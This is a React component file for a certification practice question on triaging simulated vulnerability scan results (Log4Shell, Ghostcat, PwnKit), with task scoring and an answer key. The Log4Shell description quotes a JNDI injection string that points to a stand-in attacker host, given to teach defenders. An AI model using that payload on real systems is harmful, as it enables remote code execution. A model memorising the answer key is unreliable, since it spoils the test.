"use client";

import { useState, useMemo } from "react";

/* ════════════════════════════ TYPES ════════════════════════════ */

type VulnSeverity = "CRITICAL" | "HIGH" | "MEDIUM";
type SeverityFilter = "ALL" | VulnSeverity;

interface VulnEntry {
  id: string;
  cve: string;
  cvss: number;
  severity: VulnSeverity;
  host: string;
  port: string;
  service: string;
  title: string;
  description: string;
  remediationOptions?: string[];
  correctRemediationIndex?: number;
}

interface Q3Scores {
  t1_viewedCritical: boolean;
  t2_viewedLog4Shell: boolean;
  t3_correctRemediation: boolean;
  t4_identifiedHighestRiskHost: boolean;
  t5_submittedPlan: boolean;
}

/* ════════════════════════════ SCAN DATA ════════════════════════════ */

const VULNS: VulnEntry[] = [
  {
    id: "v1",
    cve: "CVE-2021-44228",
    cvss: 10.0,
    severity: "CRITICAL",
    host: "10.10.5.22",
    port: "8080",
    service: "Apache Tomcat / Log4j 2.14.0",
    title: "Log4Shell — Apache Log4j2 JNDI Remote Code Execution",
    description:
      "A remote code execution vulnerability in Apache Log4j 2.0-beta9 through 2.14.1. The JNDI lookup feature allows an attacker to cause the server to fetch and execute a remote payload by injecting a malicious string (e.g., ${jndi:ldap://attacker.com/exploit}) into any logged field — including HTTP headers, form parameters, or URL paths. No authentication is required. This vulnerability was actively exploited in the wild within hours of disclosure in December 2021 and affects billions of Java-based applications worldwide.",
    remediationOptions: [
      "Block inbound traffic on port 8080 at the perimeter firewall",
      "Update Log4j to version 2.17.1 or later",
      "Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true environment variable only",
      "Disable the Apache Tomcat web application server",
    ],
    correctRemediationIndex: 1,
  },
  {
    id: "v2",
    cve: "CVE-2021-41773",
    cvss: 9.8,
    severity: "CRITICAL",
    host: "10.10.5.44",
    port: "443",
    service: "Apache HTTP Server 2.4.49",
    title: "Apache HTTP Server 2.4.49 Path Traversal and Remote Code Execution",
    description:
      "A path traversal and remote code execution vulnerability in Apache HTTP Server 2.4.49 only. Attackers can use a path traversal sequence to map URLs to files outside the expected document root. If the CGI module (mod_cgi) is enabled, this can be combined to achieve unauthenticated remote code execution. This vulnerability was exploited in mass scanning campaigns within 24 hours of disclosure.",
  },
  {
    id: "v3",
    cve: "CVE-2020-1938",
    cvss: 9.8,
    severity: "CRITICAL",
    host: "10.10.5.22",
    port: "8009",
    service: "Apache Tomcat 8.5.42 (AJP Connector)",
    title: "Ghostcat — Apache Tomcat AJP File Read / Inclusion",
    description:
      "A file read and inclusion vulnerability in the AJP connector of Apache Tomcat. The AJP protocol is enabled by default and listens on 0.0.0.0:8009. An unauthenticated attacker can read any file from the web application directories deployed on the Tomcat server. If the application allows file upload, this vulnerability can be escalated to remote code execution by uploading a JSP file and including it via the AJP interface.",
  },
  {
    id: "v4",
    cve: "CVE-2016-6662",
    cvss: 9.0,
    severity: "CRITICAL",
    host: "10.10.5.45",
    port: "3306",
    service: "MySQL Server 5.6.32",
    title: "MySQL Daemon Configuration File Race Condition — Remote Code Execution",
    description:
      "A vulnerability in MySQL 5.5.x, 5.6.x, and 5.7.x allows an authenticated or remote attacker with DBA (database administrator) privileges to create a MySQL configuration file (my.cnf) in the data directory. On next service startup, MySQL loads this configuration and can be directed to execute a malicious shared library, escalating to OS-level code execution as the MySQL service account.",
  },
  {
    id: "v5",
    cve: "CVE-2021-4034",
    cvss: 7.8,
    severity: "HIGH",
    host: "10.10.5.22",
    port: "N/A",
    service: "polkit (PolicyKit) 0.115 — Linux",
    title: "PwnKit — Polkit Local Privilege Escalation",
    description:
      "A local privilege escalation vulnerability in pkexec, the polkit component present on virtually all Linux distributions. All versions since 0.96 (first published in 2009) are affected. Any unprivileged local user can exploit this memory corruption bug to obtain full root privileges. Exploitation is reliable, leaves no traces in standard system logs, and proof-of-concept code has been publicly available since January 2022.",
  },
  {
    id: "v6",
    cve: "CVE-2021-26085",
    cvss: 7.5,
    severity: "HIGH",
    host: "10.10.5.44",
    port: "8090",
    service: "Atlassian Confluence Server 6.13.23",
    title: "Confluence Server Pre-Authentication File Read via WebDAV",
    description:
      "A path traversal vulnerability in Atlassian Confluence Server before 7.13.0 affecting the WebDAV servlet. An unauthenticated remote attacker can read restricted files including configuration files, Confluence home directory contents, and internal user data. Sensitive system files accessible outside the application context can also be read if the Confluence process has sufficient OS permissions.",
  },
  {
    id: "v7",
    cve: "CVE-2020-8174",
    cvss: 7.5,
    severity: "HIGH",
    host: "10.10.5.44",
    port: "443",
    service: "Node.js 10.20.0",
    title: "Node.js napi_get_value_string_* Buffer Over-read",
    description:
      "A buffer over-read vulnerability in Node.js 10.x before 10.21.0, 12.x before 12.18.2, and 14.x before 14.4.0. Under specific conditions, napi_get_value_string_utf8() can read beyond the allocated buffer boundary, potentially exposing adjacent memory contents including heap data, configuration values, or cryptographic material.",
  },
  {
    id: "v8",
    cve: "CVE-2020-14145",
    cvss: 5.3,
    severity: "MEDIUM",
    host: "10.10.5.22",
    port: "22",
    service: "OpenSSH 7.9",
    title: "OpenSSH Client User Enumeration via Algorithm Negotiation",
    description:
      "An information disclosure vulnerability in OpenSSH clients. During algorithm negotiation, the client reveals information that allows a remote observer or man-in-the-middle to infer which usernames exist on a target system. While not directly exploitable for code execution, username enumeration accelerates brute force and credential stuffing attacks by eliminating invalid accounts from the target list.",
  },
  {
    id: "v9",
    cve: "CVE-2018-16487",
    cvss: 4.3,
    severity: "MEDIUM",
    host: "10.10.5.22",
    port: "8080",
    service: "lodash 4.17.11 (Node.js dependency)",
    title: "lodash Prototype Pollution via _.defaultsDeep",
    description:
      "A prototype pollution vulnerability in lodash before 4.17.12. The _.defaultsDeep function allows an attacker to inject properties into the JavaScript Object prototype, which are then inherited by all objects in the application. While the base CVSS score is moderate, this vulnerability can be chained with other exploits — particularly in server-side JavaScript environments — to achieve remote code execution.",
  },
];

const HOST_LABELS: Record<string, string> = {
  "10.10.5.22": "HR Portal (Tomcat)",
  "10.10.5.44": "Public Web Server (Apache)",
  "10.10.5.45": "Database Server (MySQL)",
};

/* ════════════════════════════ TASK DEFINITIONS ════════════════════════════ */

const Q3_TASKS = [
  {
    key: "t1_viewedCritical" as keyof Q3Scores,
    label: "Task 1 — Filtered the vulnerability list to show Critical severity findings",
    correctExplanation:
      "You filtered the results to Critical severity. In vulnerability management, triage begins by isolating the highest-severity findings. Critical findings (CVSS ≥ 9.0) represent the most immediately exploitable risks and must be addressed first. Filtering to Critical surfaces the 4 findings that require emergency-level response, with CVE-2021-44228 (Log4Shell, CVSS 10.0) at the top.",
    incorrectExplanation:
      "You did not filter the results to Critical severity. In vulnerability management, triage begins by isolating Critical findings (CVSS ≥ 9.0) — these are the most immediately exploitable and carry the highest probability of successful attack. Clicking the Critical filter is the standard first step in any prioritized remediation workflow.",
  },
  {
    key: "t2_viewedLog4Shell" as keyof Q3Scores,
    label: "Task 2 — Opened and reviewed CVE-2021-44228 (Log4Shell, CVSS 10.0)",
    correctExplanation:
      "You opened CVE-2021-44228 (Log4Shell) for detailed review. This vulnerability carries the maximum possible CVSS base score of 10.0, reflecting trivial exploitation — no authentication required, remotely exploitable via any logged user input, affects a pervasive library used in billions of Java applications. Log4Shell is the highest-priority finding in this scan and the first remediation action required.",
    incorrectExplanation:
      "You did not review CVE-2021-44228 (Log4Shell). This finding has a CVSS score of 10.0 — the maximum — and is present on 10.10.5.22, the same server that was the target of a successful brute force attack in the recent security incident. It requires the highest remediation priority of any finding in this scan.",
  },
  {
    key: "t3_correctRemediation" as keyof Q3Scores,
    label: "Task 3 — Selected the correct remediation action for Log4Shell",
    correctExplanation:
      "You correctly selected 'Update Log4j to version 2.17.1 or later.' Log4j 2.17.1 (2.12.4 for Java 8, 2.3.2 for Java 7) is the first version providing a complete fix for all Log4Shell-related vulnerabilities, including the incomplete patch in 2.15.0 (CVE-2021-45046) and the bypass in 2.16.0 (CVE-2021-45105). The LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable only addresses the original exploit vector and is bypassed by multiple known techniques.",
    incorrectExplanation:
      "You did not select the correct Log4Shell remediation. The correct action is to update Log4j to 2.17.1 or later — versions 2.15.0 and 2.16.0 contain incomplete fixes with known bypasses. Setting LOG4J_FORMAT_MSG_NO_LOOKUPS=true only addresses the original CVE and fails against subsequent bypass techniques. Blocking port 8080 only reduces exposure without fixing the vulnerability, and disabling the server is not an acceptable production remediation.",
  },
  {
    key: "t4_identifiedHighestRiskHost" as keyof Q3Scores,
    label: "Task 4 — Identified 10.10.5.22 as the highest-risk host requiring immediate patching",
    correctExplanation:
      "You correctly identified 10.10.5.22 (HR Portal) as the highest-risk host. It has the most findings of any host in the scan (5 total), includes the CVSS 10.0 Log4Shell vulnerability and CVSS 9.8 Ghostcat, and is the same server targeted in the recent successful brute force attack. Hosts are prioritized by: (1) maximum CVSS score present, (2) total count of critical/high findings, (3) business sensitivity of the hosted system.",
    incorrectExplanation:
      "You did not identify 10.10.5.22 as the highest-risk host. This server has 5 scan findings — more than any other — including the CVSS 10.0 Log4Shell and CVSS 9.8 Ghostcat vulnerabilities. It also hosts the HR Portal (sensitive employee data) and was the target of the successful brute force attack documented in the previous incident. These factors combine to make 10.10.5.22 the clear highest-priority remediation target.",
  },
  {
    key: "t5_submittedPlan" as keyof Q3Scores,
    label: "Task 5 — Submitted the prioritized remediation plan",
    correctExplanation:
      "You submitted the remediation plan. Formal documentation of the remediation plan creates the audit trail required for vulnerability management compliance, communicates priorities to the patching team with clear SLA expectations, and establishes the baseline for tracking closure of each finding. Vulnerability management programs typically require Critical findings to be remediated within 24–72 hours and High findings within 7–30 days.",
    incorrectExplanation:
      "You did not submit the remediation plan. After identifying and prioritizing vulnerabilities, submitting a formal plan is the required next step — it initiates the patching workflow, communicates priorities to system owners, and satisfies compliance requirements for tracked remediation. Without a submitted plan, the discovered vulnerabilities remain untracked and unresolved.",
  },
];

/* ════════════════════════════ LEFT PANEL ════════════════════════════ */

function LeftPanel3({ open, onClose }: { open: boolean; onClose: () => void }) {
  return (
    <div
      style={{
        width: open ? "292px" : "0px",
        minWidth: open ? "292px" : "0px",
        transition: "width 0.22s ease, min-width 0.22s ease",
        overflow: "hidden",
        borderRight: open ? "1px solid #DDDDDD" : "none",
        backgroundColor: "#F5F7FA",
        display: "flex",
        flexDirection: "column",
        height: "100%",
      }}
    >
      <div
        style={{
          backgroundColor: "#0A1628",
          color: "white",
          padding: "0 12px",
          height: "44px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          flexShrink: 0,
          minWidth: "292px",
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
            <polyline points="14,2 14,8 20,8" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
            <line x1="16" y1="13" x2="8" y2="13" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
            <line x1="16" y1="17" x2="8" y2="17" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
          </svg>
          <span style={{ fontSize: "12px", fontWeight: 700, letterSpacing: "0.06em" }}>TEST QUESTION</span>
        </div>
        <button onClick={onClose} style={{ background: "none", border: "none", cursor: "pointer", padding: "2px", opacity: 0.8 }}>
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none">
            <line x1="18" y1="6" x2="6" y2="18" stroke="white" strokeWidth="2.2" strokeLinecap="round" />
            <line x1="6" y1="6" x2="18" y2="18" stroke="white" strokeWidth="2.2" strokeLinecap="round" />
          </svg>
        </button>
      </div>
      <div style={{ flex: 1, overflowY: "auto", overflowX: "hidden", padding: "18px 16px 24px", minWidth: "292px" }}>
        <div style={{ marginBottom: "20px" }}>
          <h2 style={{ fontSize: "11px", fontWeight: 800, letterSpacing: "0.1em", color: "#0A1628", margin: "0 0 12px", borderBottom: "2px solid #F5A623", paddingBottom: "6px", textTransform: "uppercase" }}>
            Scenario
          </h2>
          <p style={{ fontSize: "12.5px", lineHeight: "1.75", color: "#1e293b", marginBottom: "12px" }}>
            Following the brute force attack on the HR Portal identified in the previous incident, IT Director James Whitfield has commissioned an emergency vulnerability scan of all servers in the DMZ network segment. The scan was completed overnight by the automated vulnerability scanner.
          </p>
          <p style={{ fontSize: "12.5px", lineHeight: "1.75", color: "#1e293b", marginBottom: "12px" }}>
            The scan targeted three servers: the HR Portal (10.10.5.22), the public-facing Apache web server (10.10.5.44), and the MySQL database server (10.10.5.45). A total of 9 findings were identified across severity levels ranging from Medium to Critical.
          </p>
          <p style={{ fontSize: "12.5px", lineHeight: "1.75", color: "#1e293b" }}>
            As the security analyst assigned to this task, you must review the scan results, identify the most critical vulnerability, determine the correct remediation action, and identify which server should be prioritized for immediate patching.
          </p>
        </div>
        <div>
          <h2 style={{ fontSize: "11px", fontWeight: 800, letterSpacing: "0.1em", color: "#0A1628", margin: "0 0 12px", borderBottom: "2px solid #F5A623", paddingBottom: "6px", textTransform: "uppercase" }}>
            Instructions
          </h2>
          <ol style={{ margin: 0, padding: "0 0 0 18px" }}>
            {[
              "Filter the scan results to show only Critical severity findings to begin your triage.",
              "Review each Critical finding in detail by clicking on its row. Pay particular attention to the finding with the highest CVSS score.",
              "For the highest-severity Critical finding, select the correct remediation action from the options provided.",
              "Review the Host Risk Summary below the findings table. Identify which server is the highest-priority target for patching.",
              "Submit your prioritized remediation plan when your analysis is complete.",
            ].map((s, i) => (
              <li key={i} style={{ fontSize: "12.5px", lineHeight: "1.7", color: "#1e293b", marginBottom: "10px" }}>{s}</li>
            ))}
          </ol>
          <p style={{ fontSize: "11.5px", fontStyle: "italic", color: "#64748b", marginTop: "16px", lineHeight: "1.6" }}>
            CVSS scores follow the NVD Base Score standard. CRITICAL = 9.0–10.0, HIGH = 7.0–8.9, MEDIUM = 4.0–6.9, LOW = 0.1–3.9.
          </p>
        </div>
      </div>
    </div>
  );
}

/* ════════════════════════════ SEVERITY STYLES ════════════════════════════ */

const SEV: Record<VulnSeverity, { bg: string; text: string; border: string; rowBg: string }> = {
  CRITICAL: { bg: "#FEF2F2", text: "#DC2626", border: "#FECACA", rowBg: "#FFFAFA" },
  HIGH:     { bg: "#FFF7ED", text: "#C2410C", border: "#FED7AA", rowBg: "#FFFDF8" },
  MEDIUM:   { bg: "#FFFBEB", text: "#B45309", border: "#FDE68A", rowBg: "#FFFFFB" },
};

function SevBadge({ s }: { s: VulnSeverity }) {
  const st = SEV[s];
  return (
    <span style={{ display: "inline-block", backgroundColor: st.bg, color: st.text, border: `1px solid ${st.border}`, borderRadius: "5px", padding: "2px 8px", fontSize: "10.5px", fontWeight: 700, letterSpacing: "0.04em", whiteSpace: "nowrap" }}>
      {s}
    </span>
  );
}

/* ════════════════════════════ VULN TABLE ════════════════════════════ */

function VulnTable({
  vulns,
  openId,
  setOpenId,
  selectedRemediation,
  onSelectRemediation,
  onViewLog4Shell,
}: {
  vulns: VulnEntry[];
  openId: string | null;
  setOpenId: (id: string | null) => void;
  selectedRemediation: number | null;
  onSelectRemediation: (idx: number) => void;
  onViewLog4Shell: () => void;
}) {
  return (
    <div style={{ border: "1px solid #E2E8F0", borderRadius: "8px", overflow: "hidden", backgroundColor: "white" }}>
      {/* Table header */}
      <div style={{ display: "grid", gridTemplateColumns: "90px 56px 100px 130px 1fr", backgroundColor: "#F8FAFC", borderBottom: "1px solid #E2E8F0", padding: "9px 14px" }}>
        {["CVE ID", "CVSS", "Severity", "Host : Port", "Vulnerability Title"].map((h) => (
          <div key={h} style={{ fontSize: "10.5px", fontWeight: 700, color: "#64748B", letterSpacing: "0.06em", textTransform: "uppercase" }}>{h}</div>
        ))}
      </div>

      {vulns.map((v, idx) => {
        const isOpen = openId === v.id;
        const bg = isOpen ? "#F0F7FF" : SEV[v.severity].rowBg;
        const isLog4Shell = v.id === "v1";

        return (
          <div key={v.id} style={{ borderBottom: idx < vulns.length - 1 ? "1px solid #F1F5F9" : "none" }}>
            {/* Main row */}
            <div
              onClick={() => {
                const next = isOpen ? null : v.id;
                setOpenId(next);
                if (next === "v1") onViewLog4Shell();
              }}
              style={{
                display: "grid",
                gridTemplateColumns: "90px 56px 100px 130px 1fr",
                padding: "10px 14px",
                backgroundColor: bg,
                cursor: "pointer",
                alignItems: "center",
                borderLeft: isOpen ? "3px solid #3B82F6" : "3px solid transparent",
                transition: "background-color 0.1s",
              }}
              onMouseEnter={(e) => { if (!isOpen) (e.currentTarget as HTMLDivElement).style.backgroundColor = "#F0F7FF"; }}
              onMouseLeave={(e) => { if (!isOpen) (e.currentTarget as HTMLDivElement).style.backgroundColor = bg; }}
            >
              <span style={{ fontFamily: "ui-monospace, monospace", fontSize: "11.5px", color: "#1E40AF", fontWeight: 600 }}>{v.cve}</span>
              <span style={{ fontFamily: "ui-monospace, monospace", fontSize: "13px", fontWeight: 800, color: SEV[v.severity].text }}>{v.cvss.toFixed(1)}</span>
              <div><SevBadge s={v.severity} /></div>
              <span style={{ fontFamily: "ui-monospace, monospace", fontSize: "11.5px", color: "#374151" }}>{v.host}:{v.port}</span>
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <span style={{ fontSize: "13px", color: "#1E293B", fontWeight: 500 }}>{v.title}</span>
                {isLog4Shell && (
                  <span style={{ backgroundColor: "#FEF2F2", color: "#DC2626", border: "1px solid #FCA5A5", borderRadius: "4px", padding: "1px 6px", fontSize: "9.5px", fontWeight: 700 }}>
                    HIGHEST PRIORITY
                  </span>
                )}
              </div>
            </div>

            {/* Expanded detail */}
            {isOpen && (
              <div style={{ backgroundColor: "#F8FBFF", borderTop: "1px solid #DBEAFE", padding: "16px 18px 18px" }}>
                <div style={{ marginBottom: "12px" }}>
                  <div style={{ fontSize: "10.5px", fontWeight: 700, color: "#64748B", textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: "5px" }}>
                    Description
                  </div>
                  <p style={{ fontSize: "12.5px", lineHeight: "1.7", color: "#1E293B", margin: 0 }}>{v.description}</p>
                </div>

                <div style={{ display: "flex", gap: "24px", marginBottom: v.remediationOptions ? "16px" : "0", flexWrap: "wrap" }}>
                  <div>
                    <div style={{ fontSize: "10.5px", fontWeight: 700, color: "#64748B", textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: "3px" }}>Affected Host</div>
                    <span style={{ fontFamily: "ui-monospace, monospace", fontSize: "12px", color: "#1E293B" }}>{v.host}:{v.port}</span>
                  </div>
                  <div>
                    <div style={{ fontSize: "10.5px", fontWeight: 700, color: "#64748B", textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: "3px" }}>Service</div>
                    <span style={{ fontSize: "12px", color: "#1E293B" }}>{v.service}</span>
                  </div>
                  <div>
                    <div style={{ fontSize: "10.5px", fontWeight: 700, color: "#64748B", textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: "3px" }}>CVSS Base Score</div>
                    <span style={{ fontFamily: "ui-monospace, monospace", fontSize: "13px", fontWeight: 800, color: SEV[v.severity].text }}>{v.cvss.toFixed(1)} — {v.severity}</span>
                  </div>
                </div>

                {v.remediationOptions && (
                  <div>
                    <div style={{ fontSize: "11.5px", fontWeight: 700, color: "#0A1628", marginBottom: "8px" }}>
                      Select the correct remediation action for this vulnerability:
                    </div>
                    <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
                      {v.remediationOptions.map((opt, i) => {
                        const isSelected = selectedRemediation === i;
                        const isCorrect = i === v.correctRemediationIndex;
                        const showResult = selectedRemediation !== null;
                        let bgColor = isSelected ? "#EFF6FF" : "white";
                        let borderColor = isSelected ? "#3B82F6" : "#E2E8F0";
                        if (showResult && isSelected && isCorrect) { bgColor = "#F0FDF4"; borderColor = "#16A34A"; }
                        if (showResult && isSelected && !isCorrect) { bgColor = "#FEF2F2"; borderColor = "#DC2626"; }
                        return (
                          <label
                            key={i}
                            style={{ display: "flex", alignItems: "flex-start", gap: "10px", padding: "9px 12px", backgroundColor: bgColor, border: `1px solid ${borderColor}`, borderRadius: "6px", cursor: "pointer" }}
                          >
                            <input
                              type="radio"
                              name="remediation"
                              checked={isSelected}
                              onChange={() => onSelectRemediation(i)}
                              style={{ marginTop: "2px", flexShrink: 0, cursor: "pointer" }}
                            />
                            <span style={{ fontSize: "13px", color: "#1E293B" }}>{opt}</span>
                            {showResult && isSelected && isCorrect && (
                              <span style={{ marginLeft: "auto", color: "#16A34A", fontSize: "12px", fontWeight: 700, whiteSpace: "nowrap" }}>✓ Correct</span>
                            )}
                            {showResult && isSelected && !isCorrect && (
                              <span style={{ marginLeft: "auto", color: "#DC2626", fontSize: "12px", fontWeight: 700, whiteSpace: "nowrap" }}>✗ Incorrect</span>
                            )}
                          </label>
                        );
                      })}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

/* ════════════════════════════ HOST RISK SUMMARY ════════════════════════════ */

function HostRiskSummary({
  selectedHost,
  onSelectHost,
}: {
  selectedHost: string;
  onSelectHost: (host: string) => void;
}) {
  const hostStats = useMemo(() => {
    const stats: Record<string, { critical: number; high: number; medium: number; maxCvss: number }> = {};
    VULNS.forEach((v) => {
      if (!stats[v.host]) stats[v.host] = { critical: 0, high: 0, medium: 0, maxCvss: 0 };
      if (v.severity === "CRITICAL") stats[v.host].critical++;
      if (v.severity === "HIGH") stats[v.host].medium++;
      if (v.severity === "MEDIUM") stats[v.host].medium++;
      if (v.cvss > stats[v.host].maxCvss) stats[v.host].maxCvss = v.cvss;
    });
    // recount properly
    const proper: Record<string, { critical: number; high: number; medium: number; maxCvss: number; total: number }> = {};
    VULNS.forEach((v) => {
      if (!proper[v.host]) proper[v.host] = { critical: 0, high: 0, medium: 0, maxCvss: 0, total: 0 };
      proper[v.host].total++;
      if (v.severity === "CRITICAL") proper[v.host].critical++;
      else if (v.severity === "HIGH") proper[v.host].high++;
      else proper[v.host].medium++;
      if (v.cvss > proper[v.host].maxCvss) proper[v.host].maxCvss = v.cvss;
    });
    return proper;
  }, []);

  const hosts = Object.keys(hostStats).sort((a, b) => {
    const sa = hostStats[a], sb = hostStats[b];
    if (sb.maxCvss !== sa.maxCvss) return sb.maxCvss - sa.maxCvss;
    return sb.total - sa.total;
  });

  return (
    <div style={{ backgroundColor: "white", border: "1px solid #E2E8F0", borderRadius: "8px", overflow: "hidden" }}>
      <div style={{ backgroundColor: "#F8FAFC", borderBottom: "1px solid #E2E8F0", padding: "10px 14px" }}>
        <span style={{ fontSize: "13px", fontWeight: 700, color: "#0A1628" }}>Host Risk Summary</span>
        <span style={{ fontSize: "12px", color: "#64748B", marginLeft: "10px" }}>Select the host that should be prioritized for immediate patching</span>
      </div>
      <div style={{ padding: "12px 14px", display: "flex", gap: "12px", flexWrap: "wrap" }}>
        {hosts.map((host) => {
          const s = hostStats[host];
          const isSelected = selectedHost === host;
          return (
            <label
              key={host}
              style={{
                display: "flex",
                alignItems: "flex-start",
                gap: "10px",
                flex: "1",
                minWidth: "200px",
                padding: "12px 14px",
                backgroundColor: isSelected ? "#EFF6FF" : "#F8FAFC",
                border: `2px solid ${isSelected ? "#3B82F6" : "#E2E8F0"}`,
                borderRadius: "8px",
                cursor: "pointer",
              }}
            >
              <input type="radio" name="hostRisk" checked={isSelected} onChange={() => onSelectHost(host)} style={{ marginTop: "3px", flexShrink: 0, cursor: "pointer" }} />
              <div>
                <div style={{ fontFamily: "ui-monospace, monospace", fontSize: "13px", fontWeight: 700, color: "#1E293B", marginBottom: "4px" }}>
                  {host}
                </div>
                <div style={{ fontSize: "11.5px", color: "#64748B", marginBottom: "6px" }}>{HOST_LABELS[host]}</div>
                <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
                  {s.critical > 0 && <span style={{ backgroundColor: "#FEF2F2", color: "#DC2626", border: "1px solid #FECACA", borderRadius: "4px", padding: "1px 7px", fontSize: "10.5px", fontWeight: 700 }}>{s.critical} Critical</span>}
                  {s.high > 0 && <span style={{ backgroundColor: "#FFF7ED", color: "#C2410C", border: "1px solid #FED7AA", borderRadius: "4px", padding: "1px 7px", fontSize: "10.5px", fontWeight: 700 }}>{s.high} High</span>}
                  {s.medium > 0 && <span style={{ backgroundColor: "#FFFBEB", color: "#B45309", border: "1px solid #FDE68A", borderRadius: "4px", padding: "1px 7px", fontSize: "10.5px", fontWeight: 700 }}>{s.medium} Medium</span>}
                  <span style={{ backgroundColor: "#F1F5F9", color: "#475569", borderRadius: "4px", padding: "1px 7px", fontSize: "10.5px", fontWeight: 600 }}>Max CVSS {s.maxCvss.toFixed(1)}</span>
                </div>
              </div>
            </label>
          );
        })}
      </div>
    </div>
  );
}

/* ════════════════════════════ REMEDIATION PLAN ════════════════════════════ */

function RemediationPlanSection({ submitted, onSubmit }: { submitted: boolean; onSubmit: () => void }) {
  return (
    <div style={{ backgroundColor: "white", border: "1px solid #E2E8F0", borderRadius: "8px", padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "12px" }}>
      <div>
        <div style={{ fontSize: "13px", fontWeight: 700, color: "#0A1628", marginBottom: "3px" }}>Remediation Plan</div>
        <div style={{ fontSize: "12px", color: "#64748B" }}>
          When your analysis is complete, submit the prioritized remediation plan to the patching team.
        </div>
      </div>
      {submitted ? (
        <div style={{ display: "flex", alignItems: "center", gap: "8px", color: "#16A34A", fontSize: "13px", fontWeight: 600 }}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="12" r="10" fill="#16A34A" />
            <polyline points="8,12 11,15 16,9" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
          Remediation plan submitted
        </div>
      ) : (
        <button
          onClick={onSubmit}
          style={{ backgroundColor: "#0A1628", color: "white", border: "none", borderRadius: "6px", padding: "9px 22px", fontSize: "13px", fontWeight: 700, cursor: "pointer" }}
        >
          Submit Remediation Plan
        </button>
      )}
    </div>
  );
}

/* ════════════════════════════ FINISH TASK LIST ════════════════════════════ */

const Q3_FINISH_TASKS = [
  { key: "t1_viewedCritical" as keyof Q3Scores },
  { key: "t2_viewedLog4Shell" as keyof Q3Scores },
  { key: "t3_correctRemediation" as keyof Q3Scores },
  { key: "t4_identifiedHighestRiskHost" as keyof Q3Scores },
  { key: "t5_submittedPlan" as keyof Q3Scores },
];

/* ════════════════════════════ RESULTS PANEL ════════════════════════════ */

function ResultsPanel3({ scores, onExit, onNext }: { scores: Q3Scores; onExit: () => void; onNext?: () => void }) {
  const total = Object.values(scores).filter(Boolean).length;
  return (
    <div style={{ position: "fixed", inset: 0, zIndex: 60, backgroundColor: "rgba(0,0,0,0.55)", display: "flex", alignItems: "center", justifyContent: "center" }}>
      <div style={{ backgroundColor: "white", borderRadius: "12px", boxShadow: "0 24px 60px rgba(0,0,0,0.35)", overflow: "hidden", minWidth: "360px", maxWidth: "480px", width: "100%" }}>
        <div style={{ backgroundColor: "#0A1628", padding: "28px 32px 24px", textAlign: "center" }}>
          <div style={{ width: "64px", height: "64px", borderRadius: "50%", backgroundColor: total >= 4 ? "#2E7D32" : total >= 2 ? "#E65100" : "#C62828", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px", boxShadow: "0 0 0 6px rgba(255,255,255,0.12)" }}>
            {total >= 3 ? <svg width="30" height="30" viewBox="0 0 24 24" fill="none"><polyline points="20,6 9,17 4,12" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg> : <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><line x1="18" y1="6" x2="6" y2="18" stroke="white" strokeWidth="2.5" strokeLinecap="round" /><line x1="6" y1="6" x2="18" y2="18" stroke="white" strokeWidth="2.5" strokeLinecap="round" /></svg>}
          </div>
          <div style={{ color: "white", fontSize: "24px", fontWeight: 800, letterSpacing: "-0.02em" }}>{total} out of {Q3_TASKS.length} correct</div>
          <div style={{ display: "flex", justifyContent: "center", gap: "6px", marginTop: "14px", flexWrap: "wrap" }}>
            {Q3_TASKS.map((t, i) => {
              const ok = scores[t.key];
              return (
                <div key={i} style={{ display: "flex", alignItems: "center", gap: "4px", backgroundColor: ok ? "rgba(46,125,50,0.3)" : "rgba(198,40,40,0.3)", borderRadius: "16px", padding: "3px 9px 3px 6px", fontSize: "11px", color: ok ? "#A5D6A7" : "#FFCDD2", fontWeight: 600 }}>
                  {ok ? <svg width="11" height="11" viewBox="0 0 24 24" fill="none"><polyline points="20,6 9,17 4,12" stroke="#A5D6A7" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round" /></svg> : <svg width="10" height="10" viewBox="0 0 24 24" fill="none"><line x1="18" y1="6" x2="6" y2="18" stroke="#FFCDD2" strokeWidth="2.8" strokeLinecap="round" /><line x1="6" y1="6" x2="18" y2="18" stroke="#FFCDD2" strokeWidth="2.8" strokeLinecap="round" /></svg>}
                  T{i + 1}
                </div>
              );
            })}
          </div>
        </div>
        <div style={{ padding: "24px 32px 28px", textAlign: "center" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "12px", flexWrap: "wrap" }}>
            <button onClick={onExit} style={{ backgroundColor: "white", color: "#0A1628", border: "2px solid #0A1628", borderRadius: "6px", padding: "11px 28px", fontSize: "13.5px", fontWeight: 700, cursor: "pointer" }}>Back to Home</button>
            {onNext && <button onClick={onNext} style={{ backgroundColor: "#0066CC", color: "white", border: "none", borderRadius: "6px", padding: "12px 28px", fontSize: "13.5px", fontWeight: 700, cursor: "pointer", boxShadow: "0 2px 10px rgba(0,102,204,0.35)" }}>Next Question →</button>}
          </div>
          <div style={{ fontSize: "11px", color: "#9CA3AF", marginTop: "18px" }}>© Cert2Hire. All Rights Reserved.</div>
        </div>
